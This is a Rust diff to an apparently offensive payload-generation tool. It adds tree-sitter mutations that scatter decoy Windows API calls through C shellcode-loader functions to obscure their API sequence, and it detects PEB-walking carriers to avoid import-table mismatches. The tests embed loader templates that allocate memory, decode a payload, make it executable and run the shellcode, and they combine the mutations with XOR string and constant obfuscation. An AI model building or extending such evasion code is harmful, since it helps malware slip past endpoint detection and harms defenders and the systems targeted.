@@ -25,6 +25,7 @@ use tree_sitter::Parser;
 
 use crate::mutator::MutationSpec;
 use crate::template::assembler::{MutationMarker, extract_mutation_markers};
+use crate::transform::benign_catalog::{self, BehaviorGroup};
 
 /// AST-level mutator backed by tree-sitter.
 pub struct AstMutator {
@@ -60,6 +61,7 @@ impl AstMutator {
         // Separate global mutations from marker-based ones
         let mut string_xor_spec: Option<&MutationSpec> = None;
         let mut const_obfuscation_spec: Option<&MutationSpec> = None;
+        let mut benign_insert_spec: Option<&MutationSpec> = None;
         let mut marker_mutations: Vec<&MutationSpec> = Vec::new();
 
         for mutation in mutations {
@@ -67,6 +69,7 @@ impl AstMutator {
             match name {
                 "string_xor" => string_xor_spec = Some(mutation),
                 "const_obfuscation" => const_obfuscation_spec = Some(mutation),
+                "benign_syscall_insert" => benign_insert_spec = Some(mutation),
                 _ => marker_mutations.push(mutation),
             }
         }
@@ -107,6 +110,13 @@ impl AstMutator {
             }
         }
 
+        // Phase 1.5: global benign_syscall_insert (before const/string obfuscation)
+        if let Some(spec) = benign_insert_spec {
+            result = self.apply_benign_syscall_insert(&result, &spec.params)?;
+            applied.push(spec.id.clone());
+            info!("Applied ast.benign_syscall_insert globally");
+        }
+
         // Phase 2a: global const_obfuscation (number_literal nodes)
         if let Some(spec) = const_obfuscation_spec {
             result = self.apply_const_obfuscation(&result, &spec.params)?;
@@ -137,6 +147,10 @@ impl AstMutator {
             "exec_decoy" => self.apply_exec_decoy(source, marker, params),
             "timing_pattern" => self.apply_timing_pattern(source, marker, params),
             "protection_transition" => self.apply_protection_transition(source, marker, params),
+            "benign_preamble" => self.apply_benign_preamble(source, marker, params),
+            "api_sequence_obfuscation" => {
+                self.apply_api_sequence_obfuscation(source, marker, params)
+            }
             _ => {
                 debug!("Unimplemented AST mutation: {} (skipping)", name);
                 Ok(source.to_string())
@@ -665,6 +679,398 @@ impl AstMutator {
 
         Ok(out.join("\n"))
     }
+
+    // ── benign_syscall_insert (global, tree-sitter) ──────────────────────
+
+    /// Insert benign Windows API calls between statements in a target function.
+    ///
+    /// Uses tree-sitter to find the target function's compound_statement body,
+    /// then distributes benign calls (from the catalog) across inter-statement
+    /// gaps, respecting dependency ordering.
+    fn apply_benign_syscall_insert(
+        &mut self,
+        source: &str,
+        params: &HashMap<String, String>,
+    ) -> Result<String> {
+        let groups_str = params
+            .get("groups")
+            .map(|s| s.as_str())
+            .unwrap_or("system_query,file_io,registry_io");
+        let count: usize = params
+            .get("count")
+            .and_then(|v| v.parse().ok())
+            .unwrap_or(8);
+        let density: f64 = params
+            .get("density")
+            .and_then(|v| v.parse().ok())
+            .unwrap_or(0.5);
+        let seed: u64 = params
+            .get("seed")
+            .and_then(|v| {
+                if v.starts_with("0x") || v.starts_with("0X") {
+                    u64::from_str_radix(&v[2..], 16).ok()
+                } else {
+                    v.parse().ok()
+                }
+            })
+            .unwrap_or(0xBE41);
+        let target_fn = params
+            .get("target_fn")
+            .map(|s| s.as_str())
+            .unwrap_or("carrier");
+
+        // Parse groups
+        let groups: Vec<BehaviorGroup> = groups_str
+            .split(',')
+            .filter_map(|s| s.trim().parse().ok())
+            .collect();
+
+        if groups.is_empty() {
+            warn!("benign_syscall_insert: no valid groups specified");
+            return Ok(source.to_string());
+        }
+
+        // Detect PEB-walk carrier: if source resolves APIs dynamically,
+        // restrict to SystemQuery-only to avoid IAT asymmetry
+        let is_peb_walk =
+            source.contains("get_func_by_name") || source.contains("get_module_by_name");
+        let groups = if is_peb_walk {
+            warn!("benign_syscall_insert: PEB-walk detected, restricting to system_query");
+            vec![BehaviorGroup::SystemQuery]
+        } else {
+            groups
+        };
+
+        info!(
+            "Benign syscall insert: target_fn={}, count={}, density={}, seed=0x{:X}",
+            target_fn, count, density, seed
+        );
+
+        // Generate ordered behaviors
+        let (declarations, statements) = benign_catalog::generate_insertion(&groups, count, seed);
+
+        if statements.is_empty() {
+            warn!("benign_syscall_insert: catalog produced no statements");
+            return Ok(source.to_string());
+        }
+
+        // Parse source with tree-sitter to find the target function
+        let tree = match self.parser.parse(source, None) {
+            Some(t) => t,
+            None => {
+                warn!("tree-sitter failed to parse source for benign_syscall_insert");
+                return Ok(source.to_string());
+            }
+        };
+
+        // Find the target function's compound_statement body
+        let body_node = match find_function_body(tree.root_node(), target_fn, source.as_bytes()) {
+            Some(n) => n,
+            None => {
+                warn!(
+                    "benign_syscall_insert: function '{}' not found in source",
+                    target_fn
+                );
+                return Ok(source.to_string());
+            }
+        };
+
+        // Collect statement positions (byte offsets of direct children in the body)
+        // Skip the opening '{' and closing '}' — we only care about statements
+        let mut stmt_positions: Vec<(usize, usize)> = Vec::new(); // (start_byte, end_byte)
+        for i in 0..body_node.named_child_count() {
+            if let Some(child) = body_node.named_child(i as u32) {
+                stmt_positions.push((child.start_byte(), child.end_byte()));
+            }
+        }
+
+        if stmt_positions.is_empty() {
+            warn!("benign_syscall_insert: target function body has no statements");
+            return Ok(source.to_string());
+        }
+
+        // Determine insertion gaps: between each pair of consecutive statements
+        // Gap i is between stmt_positions[i].end and stmt_positions[i+1].start
+        let num_gaps = stmt_positions.len().saturating_sub(1);
+        if num_gaps == 0 {
+            // Only one statement — insert after it
+            let indent = calculate_indent(source, stmt_positions[0].0);
+            let mut result = source.to_string();
+
+            // Insert declarations at the top of the function body (after '{')
+            let body_start = body_node.start_byte();
+            let open_brace = source[body_start..]
+                .find('{')
+                .map(|i| body_start + i + 1)
+                .unwrap_or(body_start + 1);
+
+            let decl_block: String = declarations
+                .iter()
+                .map(|d| format!("\n{}{}", indent, d))
+                .collect();
+
+            let stmt_block: String = statements
+                .iter()
+                .map(|s| format!("\n{}{}", indent, s))
+                .collect();
+
+            // Insert statements after the single statement
+            let insert_at = stmt_positions[0].1;
+            result.insert_str(insert_at, &stmt_block);
+
+            // Insert declarations at function top (after open brace)
+            result.insert_str(open_brace, &decl_block);
+
+            return Ok(result);
+        }
+
+        // Use seed + density to select which gaps get insertions
+        let mut rng = if seed == 0 { 1u64 } else { seed };
+        let mut selected_gaps: Vec<usize> = Vec::new();
+        for gap_idx in 0..num_gaps {
+            rng = xorshift64(rng);
+            let threshold = (density * u64::MAX as f64) as u64;
+            if rng <= threshold {
+                selected_gaps.push(gap_idx);
+            }
+        }
+
+        // If no gaps selected by density, force at least one (the middle gap)
+        if selected_gaps.is_empty() {
+            selected_gaps.push(num_gaps / 2);
+        }
+
+        // Distribute statements across selected gaps (round-robin)
+        let mut gap_assignments: HashMap<usize, Vec<usize>> = HashMap::new();
+        for (stmt_idx, gap_idx) in selected_gaps
+            .iter()
+            .cycle()
+            .take(statements.len())
+            .enumerate()
+        {
+            gap_assignments.entry(*gap_idx).or_default().push(stmt_idx);
+        }
+
+        // Determine indentation from the first statement
+        let indent = calculate_indent(source, stmt_positions[0].0);
+
+        // Build insertions: for each gap, collect the statements to insert
+        // Process in reverse gap order to preserve byte offsets
+        let mut result = source.to_string();
+
+        let mut sorted_gaps: Vec<usize> = gap_assignments.keys().copied().collect();
+        sorted_gaps.sort();
+
+        // Insert in reverse order to preserve offsets
+        for &gap_idx in sorted_gaps.iter().rev() {
+            if let Some(stmt_indices) = gap_assignments.get(&gap_idx) {
+                let insert_at = stmt_positions[gap_idx].1;
+                let block: String = stmt_indices
+                    .iter()
+                    .map(|&si| format!("\n{}{}", indent, statements[si]))
+                    .collect();
+                result.insert_str(insert_at, &block);
+            }
+        }
+
+        // Insert declarations at the top of the function body (after '{')
+        let body_start = body_node.start_byte();
+        let open_brace = source[body_start..]
+            .find('{')
+            .map(|i| body_start + i + 1)
+            .unwrap_or(body_start + 1);
+
+        let decl_block: String = declarations
+            .iter()
+            .map(|d| format!("\n{}{}", indent, d))
+            .collect();
+        result.insert_str(open_brace, &decl_block);
+
+        Ok(result)
+    }
+
+    // ── benign_preamble (marker-based) ───────────────────────────────────
+
+    /// Insert 1-3 lightweight benign calls at a `@MUTATE:benign_preamble` marker.
+    ///
+    /// Uses only SystemQuery group for minimal overhead.
+    fn apply_benign_preamble(
+        &self,
+        source: &str,
+        marker: &MutationMarker,
+        params: &HashMap<String, String>,
+    ) -> Result<String> {
+        let count: usize = params
+            .get("count")
+            .and_then(|v| v.parse().ok())
+            .unwrap_or(2);
+        let seed: u64 = params
+            .get("seed")
+            .and_then(|v| {
+                if v.starts_with("0x") || v.starts_with("0X") {
+                    u64::from_str_radix(&v[2..], 16).ok()
+                } else {
+                    v.parse().ok()
+                }
+            })
+            .unwrap_or(0xBE41);
+
+        let groups = vec![BehaviorGroup::SystemQuery];
+        let (declarations, statements) = benign_catalog::generate_insertion(&groups, count, seed);
+
+        if statements.is_empty() {
+            return Ok(source.to_string());
+        }
+
+        let lines: Vec<&str> = source.lines().collect();
+        let marker_idx = marker.line - 1;
+
+        // Find indentation from next code line
+        let indent = (marker_idx + 1..lines.len())
+            .find(|&i| {
+                let t = lines[i].trim();
+                !t.is_empty() && !t.starts_with("//")
+            })
+            .map(|i| {
+                lines[i]
+                    .chars()
+                    .take_while(|c| c.is_whitespace())
+                    .collect::<String>()
+            })
+            .unwrap_or_else(|| "    ".to_string());
+
+        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
+
+        // Insert statements after the marker
+        let mut insert_pos = marker_idx + 1;
+        for decl in &declarations {
+            out.insert(insert_pos, format!("{}{}", indent, decl));
+            insert_pos += 1;
+        }
+        for stmt in &statements {
+            out.insert(insert_pos, format!("{}{}", indent, stmt));
+            insert_pos += 1;
+        }
+
+        Ok(out.join("\n"))
+    }
+
+    // ── api_sequence_obfuscation (marker-based) ──────────────────────────
+
+    /// Insert 1-2 benign calls at a `@MUTATE:api_sequence_obfuscation` marker.
+    ///
+    /// Picks from all groups to maximize diversity of inserted tokens.
+    fn apply_api_sequence_obfuscation(
+        &self,
+        source: &str,
+        marker: &MutationMarker,
+        params: &HashMap<String, String>,
+    ) -> Result<String> {
+        let count: usize = params
+            .get("count")
+            .and_then(|v| v.parse().ok())
+            .unwrap_or(2);
+        let seed: u64 = params
+            .get("seed")
+            .and_then(|v| {
+                if v.starts_with("0x") || v.starts_with("0X") {
+                    u64::from_str_radix(&v[2..], 16).ok()
+                } else {
+                    v.parse().ok()
+                }
+            })
+            .unwrap_or(0xBE41);
+
+        let groups = vec![
+            BehaviorGroup::SystemQuery,
+            BehaviorGroup::FileIo,
+            BehaviorGroup::RegistryIo,
+        ];
+        let (declarations, statements) = benign_catalog::generate_insertion(&groups, count, seed);
+
+        if statements.is_empty() {
+            return Ok(source.to_string());
+        }
+
+        let lines: Vec<&str> = source.lines().collect();
+        let marker_idx = marker.line - 1;
+
+        let indent = (marker_idx + 1..lines.len())
+            .find(|&i| {
+                let t = lines[i].trim();
+                !t.is_empty() && !t.starts_with("//")
+            })
+            .map(|i| {
+                lines[i]
+                    .chars()
+                    .take_while(|c| c.is_whitespace())
+                    .collect::<String>()
+            })
+            .unwrap_or_else(|| "    ".to_string());
+
+        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
+
+        let mut insert_pos = marker_idx + 1;
+        for decl in &declarations {
+            out.insert(insert_pos, format!("{}{}", indent, decl));
+            insert_pos += 1;
+        }
+        for stmt in &statements {
+            out.insert(insert_pos, format!("{}{}", indent, stmt));
+            insert_pos += 1;
+        }
+
+        Ok(out.join("\n"))
+    }
+}
+
+/// Find the compound_statement body of a named function definition.
+fn find_function_body<'a>(
+    root: tree_sitter::Node<'a>,
+    name: &str,
+    source: &[u8],
+) -> Option<tree_sitter::Node<'a>> {
+    for i in 0..root.child_count() as u32 {
+        let child = root.child(i)?;
+        if child.kind() == "function_definition" {
+            // Look for the declarator → identifier matching the function name
+            if let Some(declarator) = child.child_by_field_name("declarator")
+                && function_declarator_name(declarator, source) == Some(name)
+            {
+                // Return the compound_statement body
+                return child.child_by_field_name("body");
+            }
+        }
+    }
+    None
+}
+
+/// Extract the function name from a function_declarator node.
+fn function_declarator_name<'a>(node: tree_sitter::Node<'a>, source: &'a [u8]) -> Option<&'a str> {
+    // function_declarator has a "declarator" field which is the identifier
+    if node.kind() == "function_declarator"
+        && let Some(decl) = node.child_by_field_name("declarator")
+    {
+        return decl.utf8_text(source).ok();
+    }
+    // Could be nested (e.g., pointer_declarator wrapping function_declarator)
+    for i in 0..node.child_count() as u32 {
+        if let Some(child) = node.child(i)
+            && let Some(name) = function_declarator_name(child, source)
+        {
+            return Some(name);
+        }
+    }
+    None
+}
+
+/// Standalone xorshift64 PRNG step.
+fn xorshift64(state: u64) -> u64 {
+    let mut x = state;
+    x ^= x << 13;
+    x ^= x >> 7;
+    x ^= x << 17;
+    x
 }
 
 impl Default for AstMutator {
@@ -1935,5 +2341,538 @@ void f() {
             "0x02 should be obfuscated, got:\n{out}"
         );
         assert!(out.contains("__obf_c"), "Should have obfuscated constants");
+    }
+
+    // ── benign_syscall_insert tests ───────────────────────────────────────
+
+    fn carrier_source() -> &'static str {
+        r#"int carrier() {
+    DWORD result;
+
+    char *dest = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
+    if (!dest) return 30;
+
+    decode_payload(dest, PAYLOAD_LEN);
+
+    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
+        return 31;
+    }
+
+    EXECUTE_SHELLCODE(dest);
+    return 0;
+}"#
+    }
+
+    #[test]
+    fn test_benign_insert_basic() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[("count", "3"), ("target_fn", "carrier"), ("seed", "42")],
+        );
+        let (out, applied) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        assert!(
+            applied.contains(&"ast.benign_syscall_insert".to_string()),
+            "Should be recorded as applied"
+        );
+        // Original code preserved
+        assert!(
+            out.contains("VirtualAlloc"),
+            "VirtualAlloc should still be present"
+        );
+        assert!(
+            out.contains("MyVirtualProtect"),
+            "MyVirtualProtect should still be present"
+        );
+        assert!(
+            out.contains("EXECUTE_SHELLCODE"),
+            "EXECUTE_SHELLCODE should still be present"
+        );
+        // Benign calls inserted
+        assert!(
+            out.contains("__be_"),
+            "Should contain __be_ prefixed variables, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_declarations() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "6"),
+                ("target_fn", "carrier"),
+                ("groups", "system_query,file_io"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, _) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        // Check __be_ declarations appear before the first original statement
+        let decl_pos = out.find("__be_").unwrap_or(usize::MAX);
+        let alloc_pos = out.find("VirtualAlloc").unwrap_or(0);
+        assert!(
+            decl_pos < alloc_pos,
+            "Declarations should appear before VirtualAlloc, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_dependency_order() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "10"),
+                ("target_fn", "carrier"),
+                ("groups", "file_io"),
+                ("density", "1.0"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, _) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        // FileIo: CreateFileA must come before ReadFile, which must come before CloseHandle
+        let create_pos = out.find("CreateFileA").unwrap_or(usize::MAX);
+        let read_pos = out.find("ReadFile").unwrap_or(usize::MAX);
+        let close_pos = out.find("CloseHandle(__be_hFile)").unwrap_or(usize::MAX);
+
+        assert!(
+            create_pos < read_pos,
+            "CreateFileA must come before ReadFile, got:\n{out}"
+        );
+        assert!(
+            read_pos < close_pos,
+            "ReadFile must come before CloseHandle, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_seed_determinism() {
+        let mut ast1 = AstMutator::new().unwrap();
+        let mut ast2 = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[("count", "6"), ("target_fn", "carrier"), ("seed", "0xBEEF")],
+        );
+
+        let (out1, _) = ast1.apply(carrier_source(), &[&spec]).unwrap();
+        let (out2, _) = ast2.apply(carrier_source(), &[&spec]).unwrap();
+
+        assert_eq!(out1, out2, "Same seed should produce identical output");
+    }
+
+    #[test]
+    fn test_benign_insert_combined_with_string_xor() {
+        let mut ast = AstMutator::new().unwrap();
+        let specs = [
+            make_spec(
+                "ast.benign_syscall_insert",
+                &[
+                    ("count", "3"),
+                    ("target_fn", "carrier"),
+                    ("groups", "file_io"),
+                    ("seed", "42"),
+                ],
+            ),
+            make_spec("ast.string_xor", &[("xor_key", "0xAA")]),
+        ];
+        let refs: Vec<&MutationSpec> = specs.iter().collect();
+        let (out, applied) = ast.apply(carrier_source(), &refs).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert!(applied.contains(&"ast.string_xor".to_string()));
+        // The benign file path string should be XOR-encoded
+        assert!(
+            out.contains("xor_str_"),
+            "Benign strings should be XOR-encoded, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_missing_function() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[("count", "3"), ("target_fn", "nonexistent")],
+        );
+        let (out, applied) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        // Should still be recorded as applied but source unchanged
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert_eq!(
+            out,
+            carrier_source(),
+            "Source should be unchanged when function not found"
+        );
+    }
+
+    // ── benign_preamble marker tests ──────────────────────────────────────
+
+    #[test]
+    fn test_benign_preamble_marker() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = r#"int main(void) {
+    // @MUTATE:benign_preamble
+    int gr = guardrail();
+    return gr;
+}"#;
+        let spec = make_spec("ast.benign_preamble", &[("count", "2"), ("seed", "42")]);
+        let (out, applied) = ast.apply(source, &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.benign_preamble".to_string()));
+        // Should insert SystemQuery-only calls
+        assert!(
+            out.contains("__be_"),
+            "Should contain benign calls, got:\n{out}"
+        );
+        // Original code preserved
+        assert!(out.contains("guardrail()"));
+    }
+
+    // ── api_sequence_obfuscation marker tests ────────────────────────────
+
+    #[test]
+    fn test_api_sequence_obfuscation_marker() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = r#"int carrier() {
+    decode_payload(dest, PAYLOAD_LEN);
+    // @MUTATE:api_sequence_obfuscation
+    VirtualProtect(dest, PAYLOAD_LEN, p_RX, &result);
+    return 0;
+}"#;
+        let spec = make_spec(
+            "ast.api_sequence_obfuscation",
+            &[("count", "2"), ("seed", "42")],
+        );
+        let (out, applied) = ast.apply(source, &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.api_sequence_obfuscation".to_string()));
+        assert!(
+            out.contains("__be_"),
+            "Should contain benign calls, got:\n{out}"
+        );
+        assert!(out.contains("decode_payload"));
+        assert!(out.contains("VirtualProtect"));
+    }
+
+    // ── benign_syscall_insert edge case tests ─────────────────────────────
+
+    #[test]
+    fn test_benign_insert_density_zero_fallback() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "3"),
+                ("target_fn", "carrier"),
+                ("density", "0.0"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, applied) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        // density=0.0 → no gaps pass threshold → forced middle gap → at least 1 insertion
+        assert!(
+            out.contains("__be_"),
+            "density=0.0 should still insert via forced middle gap, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_density_one_all_gaps() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "6"),
+                ("target_fn", "carrier"),
+                ("density", "1.0"),
+                ("groups", "system_query"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, _) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        // density=1.0 → every gap selected → statements distributed across all gaps
+        // Count the benign calls inserted (SystemQuery has 3 entries, count=6 → 3 actual)
+        let be_count = out.matches("__be_tick").count()
+            + out.matches("__be_env_buf").count()
+            + out.matches("__be_comp_name").count();
+        assert!(
+            be_count > 0,
+            "density=1.0 should produce insertions in every gap, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_single_statement() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = "int carrier() {\n    return 0;\n}";
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "2"),
+                ("target_fn", "carrier"),
+                ("groups", "system_query"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, applied) = ast.apply(source, &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        // Single statement → num_gaps=0 → special-case inserts after the one statement
+        assert!(
+            out.contains("__be_"),
+            "Single-statement function should still get insertions, got:\n{out}"
+        );
+        assert!(
+            out.contains("return 0;"),
+            "Original code should be preserved"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_empty_function_body() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = "int carrier() { }";
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[("count", "2"), ("target_fn", "carrier"), ("seed", "42")],
+        );
+        let (out, applied) = ast.apply(source, &[&spec]).unwrap();
+
+        // Empty body → warns and returns unchanged
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert_eq!(
+            out.trim(),
+            source.trim(),
+            "Empty function body should return unchanged source"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_target_deconditioner() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "2"),
+                ("target_fn", "deconditioner"),
+                ("groups", "system_query"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert!(
+            out.contains("__be_"),
+            "Should insert benign calls in deconditioner(), got:\n{out}"
+        );
+        // Original deconditioner code preserved
+        assert!(
+            out.contains("VirtualAlloc"),
+            "VirtualAlloc should still be present"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_combined_with_const_obfuscation() {
+        let mut ast = AstMutator::new().unwrap();
+        let specs = [
+            make_spec(
+                "ast.benign_syscall_insert",
+                &[
+                    ("count", "3"),
+                    ("target_fn", "carrier"),
+                    ("groups", "system_query"),
+                    ("seed", "42"),
+                ],
+            ),
+            make_spec("ast.const_obfuscation", &[]),
+        ];
+        let refs: Vec<&MutationSpec> = specs.iter().collect();
+        let (out, applied) = ast.apply(carrier_source(), &refs).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
+        // Both __be_ declarations and __obf_c declarations should coexist
+        assert!(
+            out.contains("__be_"),
+            "Should have benign call declarations"
+        );
+        assert!(
+            out.contains("__obf_c"),
+            "Should have const obfuscation declarations"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_peb_walk_restricts_groups() {
+        let mut ast = AstMutator::new().unwrap();
+        // Use the real peb_walk source which contains get_func_by_name/get_module_by_name
+        let peb_source = r#"LPVOID get_module_by_name(WCHAR* module_name) { return NULL; }
+LPVOID get_func_by_name(LPVOID module, char* func_name) { return NULL; }
+int carrier() {
+    DWORD result;
+    char *dest = (char*)myVirtualAlloc(NULL, 4096, 0x3000, 0x04);
+    if (!dest) return 30;
+    decode_payload(dest, 4096);
+    if (!myVirtualProtect(dest, 4096, 0x20, &result)) return 31;
+    return 0;
+}"#;
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "6"),
+                ("target_fn", "carrier"),
+                ("groups", "system_query,file_io,registry_io"),
+                ("density", "1.0"),
+                ("seed", "42"),
+            ],
+        );
+        let (out, applied) = ast.apply(peb_source, &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        // PEB-walk detected → should restrict to SystemQuery only
+        assert!(
+            !out.contains("CreateFileA"),
+            "FileIo should NOT be inserted in PEB-walk carrier, got:\n{out}"
+        );
+        assert!(
+            !out.contains("RegOpenKeyExA"),
+            "RegistryIo should NOT be inserted in PEB-walk carrier, got:\n{out}"
+        );
+        // SystemQuery calls should be present
+        assert!(
+            out.contains("__be_"),
+            "SystemQuery calls should still be inserted, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_preamble_plus_global() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = r#"int carrier() {
+    // @MUTATE:benign_preamble
+    DWORD result;
+    char *dest = (char*)VirtualAlloc(NULL, 4096, 0x3000, 0x04);
+    decode_payload(dest, 4096);
+    return 0;
+}"#;
+        let specs = [
+            make_spec("ast.benign_preamble", &[("count", "1"), ("seed", "42")]),
+            make_spec(
+                "ast.benign_syscall_insert",
+                &[
+                    ("count", "2"),
+                    ("target_fn", "carrier"),
+                    ("groups", "system_query"),
+                    ("seed", "0xDEAD"),
+                ],
+            ),
+        ];
+        let refs: Vec<&MutationSpec> = specs.iter().collect();
+        let (out, applied) = ast.apply(source, &refs).unwrap();
+
+        assert!(applied.contains(&"ast.benign_preamble".to_string()));
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        // Both should produce insertions without crashing
+        assert!(
+            out.contains("__be_"),
+            "Both mutations should produce benign calls"
+        );
+        assert!(
+            out.contains("VirtualAlloc"),
+            "Original code should be preserved"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_count_zero() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[("count", "0"), ("target_fn", "carrier"), ("seed", "42")],
+        );
+        let (out, applied) = ast.apply(carrier_source(), &[&spec]).unwrap();
+
+        // count=0 → catalog produces no statements → source unchanged
+        assert!(applied.contains(&"ast.benign_syscall_insert".to_string()));
+        assert_eq!(
+            out,
+            carrier_source(),
+            "count=0 should produce unchanged source"
+        );
+    }
+
+    #[test]
+    fn test_benign_insert_all_carriers() {
+        let mut ast = AstMutator::new().unwrap();
+
+        // alloc_rw_rx carrier
+        let alloc_source = r#"int carrier() {
+    DWORD result;
+    char *dest = (char*)VirtualAlloc(NULL, 4096, 0x3000, 0x04);
+    if (!dest) return 30;
+    decode_payload(dest, 4096);
+    if (!MyVirtualProtect(dest, 4096, 0x20, &result)) return 31;
+    return 0;
+}"#;
+
+        // change_rw_rx carrier
+        let change_source = r#"int carrier() {
+    DWORD result;
+    char *dest = (char*)supermega_payload;
+    decode_payload(dest, 4096);
+    if (!MyVirtualProtect(dest, 4096, 0x20, &result)) return 31;
+    return 0;
+}"#;
+
+        // peb_walk carrier (contains get_func_by_name)
+        let peb_source = r#"LPVOID get_func_by_name(LPVOID m, char* n) { return NULL; }
+int carrier() {
+    char *dest = (char*)myVirtualAlloc(NULL, 4096, 0x3000, 0x04);
+    decode_payload(dest, 4096);
+    return 0;
+}"#;
+
+        let spec = make_spec(
+            "ast.benign_syscall_insert",
+            &[
+                ("count", "3"),
+                ("target_fn", "carrier"),
+                ("groups", "system_query,file_io"),
+                ("seed", "42"),
+            ],
+        );
+
+        // All three should succeed without panicking
+        let (out_alloc, _) = ast.apply(alloc_source, &[&spec]).unwrap();
+        assert!(
+            out_alloc.contains("__be_"),
+            "alloc_rw_rx should get benign calls"
+        );
+
+        let (out_change, _) = ast.apply(change_source, &[&spec]).unwrap();
+        assert!(
+            out_change.contains("__be_"),
+            "change_rw_rx should get benign calls"
+        );
+
+        let (out_peb, _) = ast.apply(peb_source, &[&spec]).unwrap();
+        assert!(
+            out_peb.contains("__be_"),
+            "peb_walk should get benign calls"
+        );
+        // peb_walk should NOT have FileIo calls
+        assert!(
+            !out_peb.contains("CreateFileA"),
+            "peb_walk should not get FileIo calls"
+        );
     }
 }
